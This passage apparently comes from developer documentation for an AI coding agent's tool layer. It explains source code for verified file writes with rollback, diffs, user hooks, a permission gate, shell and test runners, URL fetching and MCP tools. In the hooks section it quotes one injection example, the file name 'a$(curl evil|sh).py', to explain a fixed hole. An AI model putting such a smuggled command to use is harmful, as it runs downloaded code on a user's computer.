  model should re-read before an exact-match `edit_file` if it is unsure.

```python
426 |     @staticmethod
427 |     def _style_of(path: Path, previous: bytes | None) -> TextStyle:
428 |         """The style to write in: the file's own, else LF (CRLF for batch files)."""
429 |         if previous is not None:
430 |             try:
431 |                 return text_style(previous.decode("utf-8"))
432 |             except UnicodeDecodeError:
433 |                 pass
434 |         return ("\r\n" if path.suffix.lower() in CRLF_SUFFIXES else "\n"), False
435 | 
```
- The style for a write that did not come from an edit (`write_file`): an existing file keeps its own; a new file gets
  LF — or CRLF for `.bat`/`.cmd` — and no mark.

```python
436 |     def _commit(self, relative: str, text: str, style: TextStyle | None = None) -> str:
437 |         """Write ``text``; verify checkable files and roll back on failure."""
438 |         path = resolve_inside(self._root, relative)
439 |         key = path.relative_to(self._root).as_posix()
440 |         previous = path.read_bytes() if path.is_file() else None   # exact bytes, for rollback
441 |         path.parent.mkdir(parents=True, exist_ok=True)
442 |         write_text(path, text, style or self._style_of(path, previous))
443 |         if path.suffix.lower() not in CHECKED_SUFFIXES:
444 |             self.writes += 1
445 |             self._remember_diff(key, previous, path)
446 |             return f"OK: wrote {key} ({len(text.splitlines())} lines)" + self._after_edit(key)
447 |         report = verify_file(path, self._root, self._cfg.type_check)
448 |         if report.ok:
449 |             self._failures.pop(key, None)
450 |             self.writes += 1
451 |             if path.suffix == ".py":
452 |                 self._format(path)
453 |             self._remember_diff(key, previous, path)
454 |             return (f"OK: wrote {key} ({len(text.splitlines())} lines); verification passed"
455 |                     + self._after_edit(key))
456 |         if previous is None:                      # roll back: undo the bad write
457 |             path.unlink()
458 |         else:
459 |             path.write_bytes(previous)            # byte for byte, as it was
460 |         count = self._failures.get(key, 0) + 1
461 |         self._failures[key] = count
462 |         if count >= self._cfg.max_fix_attempts:
463 |             return (f"REJECTED ({count}/{self._cfg.max_fix_attempts}): {key} NOT written.\n"
464 |                     f"{report.render()}\nSTOP: attempts exhausted. Explain the problem to "
465 |                     "the user instead of retrying.")
466 |         hint = f"\n{TOGETHER_HINT}" if "F821" in report.render() else ""   # F821 = undefined name
467 |         return (f"REJECTED ({count}/{self._cfg.max_fix_attempts}): {key} NOT written. "
468 |                 f"Fix these errors and call write_file again:\n{report.render()}{hint}")
469 | 
```
- Resolves the path safely and computes `key`, the workspace-relative name used to count failures per file.
- Remembers the previous content **as bytes** (`None` for a new file) so the write can be undone exactly, creates
  parent folders, and writes in the given style (or `_style_of`).
- Files with no check (not in `CHECKED_SUFFIXES`) are just written. Checkable files (Python, JSON, TOML, YAML and the
  languages in `verify.py`'s `CHECKERS`) go through `verify_file` on the file on disk.
- **Pass:** clear this file's failure counter, count the write, run `_format` (Python only), remember the diff for
  your screen (`_remember_diff`), run the `after_edit` hook, and report success. Non-checkable files also get a diff
  and the hook. Non-Python files are
  just written and counted.
- **Fail (rollback):** delete a brand-new file, or write back an overwritten file's previous bytes unchanged. Increment
  the counter. An undefined-name error gets `TOGETHER_HINT`. When the counter reaches `max_fix_attempts` the message ends
  with `STOP`, steering the model to explain the problem
  instead of looping; otherwise it returns the exact errors and asks for a fix.

```python
470 |     def _remember_diff(self, key: str, previous: bytes | None, path: Path) -> None:
471 |         """Keep a unified diff of the change so the user can see what was edited."""
472 |         try:
473 |             now = path.read_text(encoding="utf-8-sig").splitlines()
474 |         except (OSError, UnicodeDecodeError):
475 |             now = []
476 |         before = previous.decode("utf-8-sig", "replace").splitlines() if previous is not None else []
477 |         diff = list(difflib.unified_diff(before, now, f"a/{key}", f"b/{key}", n=1, lineterm=""))
478 |         self._diff = diff[2:]                     # drop the ---/+++ header: the file is named already
479 | 
480 |     # ----- hooks: your own commands, run automatically ----------------------
```
- Compares the file before (decoded from the saved bytes; empty for a new file) and after (re-read from disk, so
  formatting is included) with `difflib.unified_diff`, one line of context, and drops the two `---`/`+++` header lines
  (the result line already names the file).

## Hooks — your own commands, run automatically
Like Claude Code's hooks. In `settings.json`:
```json
{"hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"}}
```
```python
481 |     def run_hook(self, name: str, file: str = "") -> tuple[int, str] | None:
482 |         """Run the hook ``name`` from the settings (``{file}`` = the changed file); None if unset.
483 | 
484 |         Hooks are commands YOU wrote in settings.json, so they run without a question, on this
485 |         computer, in the project folder, with the normal time limit. The file name is chosen
486 |         by the model, so it is quoted: a name can never smuggle in a command of its own.
487 |         """
488 |         command = self.hooks.get(name)
489 |         if not command:
490 |             return None
491 |         argv = shell_argv(str(command).replace("{file}", quote_for_shell(file) if file else ""))
492 |         return run_command(argv, self._root, self._cfg.command_timeout, self._cfg.max_output_chars)
493 | 
```
- Runs the named hook if it is set, through `shell_argv` (PowerShell on Windows, `sh` elsewhere), in the project folder,
  with the normal time limit and output cap. No question is asked: you wrote the command.
- `{file}` becomes the changed file's name **quoted by `quote_for_shell`**: the model chooses file names, and before 0.6
  a name like `a$(curl evil|sh).py` ran its hidden command on your computer through this very line (see `sandbox.md`).
  Ordinary names are inserted as they are, so existing hooks behave as before; do not put your own quotes around
  `{file}`.

```python
494 |     def _after_edit(self, key: str) -> str:
495 |         """Run the after_edit hook; a failure is added to the result so the model fixes it."""
496 |         outcome = self.run_hook("after_edit", key)
497 |         if outcome is None or outcome[0] == 0:
498 |             return ""
499 |         return f"\nHOOK after_edit failed (exit code {outcome[0]}):\n{outcome[1].strip()}"
500 | 
501 |     # ----- permission gate for everything that runs or reaches out ---------
```
- Runs `after_edit` after every successful write. A failing hook (exit code not 0) adds its output to the write's
  result — so the model reads, say, the linter's complaint and fixes it, the way Claude Code's PostToolUse hooks feed
  back. A passing or missing hook adds nothing (no tokens).

## The permission gate
```python
502 |     def _permitted(self, tool: str, subject: str, question: str) -> str | None:
503 |         """None when the action may go ahead; otherwise the refusal text for the model."""
504 |         decision = self.permissions.decide(tool, subject)
505 |         if decision == "deny":
506 |             return f"DENIED by a deny rule in the settings: {tool}({subject})"
507 |         if decision == "allow" or self._approve(Approval(question, tool, subject)):
508 |             return None
509 |         return "DENIED: the user did not approve this."
510 | 
511 |     # ----- execution tools (verified again, then user-approved) -------------
```
- Every action that runs code or reaches outside goes through here with its tool name, its subject (file, command,
  URL, MCP arguments) and the question text. A deny rule refuses without asking; an allow rule lets it run without
  asking; otherwise the approval function is asked with an `Approval`. Returns `None` (go ahead) or the refusal text the
  model will see.

## Execution tools and the run gate
```python
512 |     def _run_python(self, args: dict) -> str:
513 |         path = resolve_inside(self._root, args["path"])
514 |         if not path.is_file():
515 |             return f"ERROR: file '{args['path']}' does not exist"
516 |         report = verify_python(path, self._root, self._cfg.type_check)
517 |         if not report.ok:
518 |             return f"NOT RUN: verification failed:\n{report.render()}"
519 |         extra = [str(a) for a in args.get("args") or []]
520 |         relative = path.relative_to(self._root).as_posix()
521 |         denied = self._permitted("run_python", relative, f"run python {relative} {' '.join(extra)}")
522 |         if denied:
523 |             return denied
524 |         code, output = self.runner.run("python", [relative, *extra])
525 |         return f"exit code {code}\n{output}"
526 | 
```
- Resolves the path, requires the file, **verifies again** (failure → `NOT RUN` plus errors), then passes the permission
  gate with subject = the file's workspace path (verification comes first so you are never asked about code that cannot
  run). It runs with the project's Python (see `runners.md`)
  through the runner (on this computer or in the container), using the path relative to the workspace so it is the
  same in both places, and returns the exit code and output.

```python
527 |     def _run_tests(self, args: dict) -> str:
528 |         problems = self.check_workspace(since=self.started)   # files changed this session
529 |         if problems:
530 |             return "NOT RUN: verification failed:\n" + "\n".join(problems)
531 |         shown = f" ({self.test_command})" if self.test_command else ""
532 |         denied = self._permitted("run_tests", "", f"run the tests{shown}")
533 |         if denied:
534 |             return denied
535 |         code, output = self.runner.run("tests", [self.test_command] if self.test_command else [])
536 |         return f"exit code {code}\n{output}"
537 | 
```
- All checkable files changed this session (`since=self.started`) must pass `check_workspace` first. Then the permission
  gate (`run_tests`; the question names your `test_command` when there is one), then the runner runs the tests — your
  `test_command`, or the tool it finds for the project (pytest, unittest, `npm test`, `go test`, `cargo test`) —
  returning exit code and output.

```python
538 |     def _run_shell(self, args: dict) -> str:
539 |         command = str(args["command"]).strip()
540 |         if not command:
541 |             return "ERROR: empty command"
542 |         denied = self._permitted("run_shell", command, f"run ({self.runner.shell_label}): {command}")
543 |         if denied:
544 |             return denied
545 |         code, output = self.runner.run("shell", [command])
546 |         return f"exit code {code}\n{output}"
547 | 
548 |     # ----- reaching outside: web pages and MCP servers ----------------------
```
- Only exists when the runner offers a shell (Docker, or `--allow-shell`). Refuses an empty command, passes the
  permission gate with the command line as subject (question: `run (<where>): <command>`), then runs it through the
  runner.

## Reaching outside: web pages and MCP servers
```python
549 |     def _fetch_url(self, args: dict) -> str:
550 |         url = str(args["url"]).strip()
551 |         denied = self._permitted("fetch_url", url, f"fetch the web page {url}")
552 |         if denied:
553 |             return denied
554 |         try:
555 |             text = fetch_text(url)
556 |         except ValueError as exc:
557 |             return f"ERROR: could not fetch {url}: {exc}"
558 |         return truncate(text, self._cfg.max_output_chars) or "(the page has no text)"
559 | 
```
- Permission gate with the URL as subject, then `fetch_text` (see `web.md`); a fetch problem becomes `ERROR: could not
  fetch ...`; the text is cut to `max_output_chars`.

```python
560 |     def _start_mcp(self, servers: dict) -> None:
561 |         """Start each configured MCP server and add its tools as ``mcp__<server>__<tool>``."""
562 |         for name, spec in servers.items():
563 |             if not isinstance(spec, dict) or not spec.get("command"):
564 |                 self.notes.append(f"MCP server '{name}': needs a \"command\"; skipped")
565 |                 continue
566 |             server = MCPServer(name, str(spec["command"]), [str(a) for a in spec.get("args", [])],
567 |                                {str(k): str(v) for k, v in spec.get("env", {}).items()}, self._root)
568 |             try:
569 |                 server.start()
570 |             except MCPError as exc:
571 |                 server.close()
572 |                 self.notes.append(f"{exc}; skipped")
573 |                 continue
574 |             self._mcp.append(server)
575 |             for tool in server.tools:
576 |                 full = re.sub(r"[^A-Za-z0-9_-]", "_", f"mcp__{name}__{tool['name']}")[:64]
577 |                 description = str(tool.get("description", ""))[:500] or f"MCP tool from {name}"
578 |                 self._tools[full] = Tool(full, description, clean_schema(tool.get("inputSchema")),
579 |                                          self._mcp_caller(server, str(tool["name"]), full))
580 |             self.notes.append(f"MCP server '{name}': {len(server.tools)} tool(s)")
581 | 
```
- For each configured server: it must have a `command` (otherwise a note says it was skipped); it is started in the
  project folder with its arguments and environment; a server that fails to start is closed and noted.
- Each of its tools is added as `mcp__<server>__<tool>`, with characters other than letters, digits, `_` and `-`
  replaced and the name cut to 64 characters (limits model APIs impose), a description capped at 500 characters, and
  a cleaned argument schema (`clean_schema`). A note reports how many tools each server added.

```python
582 |     def _mcp_caller(self, server: MCPServer, tool: str, full: str) -> Callable[[dict], str]:
583 |         """The function behind one MCP tool: ask permission, then forward the call."""
584 |         def call(args: dict) -> str:
585 |             shown = json.dumps(args, sort_keys=True)
586 |             denied = self._permitted(full, shown, f"use MCP tool {server.name}/{tool} {shown[:200]}")
587 |             if denied:
588 |                 return denied
589 |             try:
590 |                 return server.call_tool(tool, args, timeout=self._cfg.command_timeout * 4)
591 |             except MCPError as exc:
592 |                 return f"ERROR: {exc}"
593 |         return call
```
- Builds the function behind one MCP tool. It shows the arguments as sorted JSON (the permission subject and part of the
  question), passes the permission gate, then forwards the call with a generous timeout (4× the command timeout);
  MCP problems come back as `ERROR:` text. There is no verification step because a shell command
  is not Python; the container's limits are the safety net.
